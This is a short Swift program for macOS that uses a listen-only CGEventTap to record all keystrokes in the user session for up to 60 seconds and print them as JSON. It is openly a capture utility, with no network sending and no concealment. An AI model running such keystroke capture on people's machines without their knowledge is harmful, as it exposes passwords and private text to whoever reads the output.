import Cocoa
import Foundation

// Captures keystrokes for a given number of seconds via CGEventTap.
// Outputs JSON: {"keys":"captured text","status":"ok"}
// Requires Input Monitoring permission in System Settings.

var captured: [String] = []
var done = false

let keyMap: [Int64: String] = [
    0: "a", 1: "s", 2: "d", 3: "f", 4: "h", 5: "g", 6: "z", 7: "x",
    8: "c", 9: "v", 11: "b", 12: "q", 13: "w", 14: "e", 15: "r",
    16: "y", 17: "t", 18: "1", 19: "2", 20: "3", 21: "4", 22: "6",
    23: "5", 24: "=", 25: "9", 26: "7", 27: "-", 28: "8", 29: "0",
    30: "]", 31: "o", 32: "u", 33: "[", 34: "i", 35: "p", 36: "\n",
    37: "l", 38: "j", 39: "'", 40: "k", 41: ";", 42: "\\", 43: ",",
    44: "/", 45: "n", 46: "m", 47: ".", 48: "\t", 49: " ", 50: "`",
    51: "[del]", 53: "[esc]",
]

func callback(proxy: CGEventTapProxy, type: CGEventType, event: CGEvent, refcon: UnsafeMutableRawPointer?) -> Unmanaged<CGEvent>? {
    if type == .keyDown {
        let keyCode = event.getIntegerValueField(.keyboardEventKeycode)
        let flags = event.flags

        if let ch = keyMap[keyCode] {
            if flags.contains(.maskShift) && ch.count == 1 {
                captured.append(ch.uppercased())
            } else {
                captured.append(ch)
            }
        } else {
            captured.append("[\\(keyCode)]")
        }
    }
    return Unmanaged.passRetained(event)
}

// Parse duration from args (default 10 seconds)
var duration: TimeInterval = 10
if CommandLine.arguments.count > 1, let d = Double(CommandLine.arguments[1]) {
    duration = min(d, 60) // cap at 60 seconds
}

// Create event tap
guard let tap = CGEvent.tapCreate(
    tap: .cgSessionEventTap,
    place: .headInsertEventTap,
    options: .listenOnly,
    eventsOfInterest: (1 << CGEventType.keyDown.rawValue),
    callback: callback,
    userInfo: nil
) else {
    print("{\"status\":\"error\",\"keys\":\"\"}")
    fputs("Failed to create event tap\n", stderr)
    exit(1)
}

let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0)
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)
CGEvent.tapEnable(tap: tap, enable: true)

// Stop after duration
DispatchQueue.main.asyncAfter(deadline: .now() + duration) {
    CGEvent.tapEnable(tap: tap, enable: false)
    let text = captured.joined()
    // JSON-escape the text
    if let data = try? JSONSerialization.data(withJSONObject: ["status": "ok", "keys": text]),
       let json = String(data: data, encoding: .utf8) {
        print(json)
    } else {
        print("{\"status\":\"ok\",\"keys\":\"\"}")
    }
    exit(0)
}

CFRunLoopRun()
